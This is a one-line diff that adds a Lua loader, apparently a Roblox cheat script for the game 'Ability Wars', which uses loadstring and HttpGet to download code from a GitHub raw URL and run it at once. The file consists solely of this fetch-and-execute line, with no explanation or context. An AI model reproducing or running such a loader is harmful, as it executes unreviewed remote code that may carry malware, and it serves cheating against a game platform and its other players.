@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/ability-wars-spam7-hzmrxsfho86058.lua"))()
